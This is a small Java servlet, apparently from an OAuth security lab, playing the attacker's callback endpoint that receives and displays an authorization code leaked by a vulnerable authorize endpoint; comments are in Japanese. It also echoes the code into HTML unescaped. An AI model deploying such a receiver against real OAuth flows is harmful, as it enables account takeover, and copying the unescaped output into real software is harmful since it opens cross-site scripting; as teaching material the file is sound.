package com.example.attacker;

import java.io.IOException;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;


@WebServlet("/callback")
public class AttackerCallbackServlet extends HttpServlet {
    private static final long serialVersionUID = 1L;

    /**
     * 攻撃者側callback。
     * 脆弱なauthorizeから送信された認可コードを受信する。
     */
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {

        response.setContentType("text/html; charset=UTF-8");

        String code = request.getParameter("code");

        response.getWriter().println("<h1>攻撃者側が認可コードを受信</h1>");
        response.getWriter().println("<p>code = " + code + "</p>");
    }
}